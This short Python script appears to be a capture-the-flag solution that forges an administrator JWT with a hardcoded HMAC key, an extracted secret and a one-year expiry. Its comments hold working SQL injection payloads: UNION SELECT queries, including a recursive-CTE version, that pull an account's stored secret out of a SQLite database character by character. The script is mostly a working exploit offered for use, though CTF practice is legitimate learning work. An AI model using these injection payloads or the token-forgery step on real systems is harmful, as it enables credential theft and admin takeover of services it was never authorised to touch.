import datetime

import jwt

HMAC_KEY = "xqDxTAQBYw4hEsK8ud3ASezUM4IohDW1"

if __name__ == "__main__":
    now = datetime.datetime.now(tz=datetime.timezone.utc)

    admin_jwt = {
        "iat": now,
        "exp": now + datetime.timedelta(days=365),
        # obtained via replacing n in url (with original user login):
        # https://iulplkticahjbflq.ransommethis.net/adrlarozeijppjmg/userinfo?user=' UNION SELECT uid, unicode(substr(secret, <n>, 1)), length(secret), uid from Accounts WHERE userName = 'NervousHiccups' --
        # attempt at a single request: https://iulplkticahjbflq.ransommethis.net/adrlarozeijppjmg/userinfo?user=' UNION SELECT uid, sum((WITH RECURSIVE cnt(x) AS (SELECT 31 UNION ALL SELECT x-1 FROM cnt LIMIT 32) SELECT unicode(substr(secret, x, 1))*pow(10,3*x) FROM cnt)), length(secret), uid from Accounts WHERE userName = 'NervousHiccups' --
        # Useful: https://www.sqlite.org/lang_corefunc.html
        # try beautifulsoup
        "sec": "TQ9mpDdETkLCarLuyggyK8eDvJYESLjA",
        "uid": 16498
    }
    
    print(jwt.encode(admin_jwt, HMAC_KEY, algorithm='HS256'))
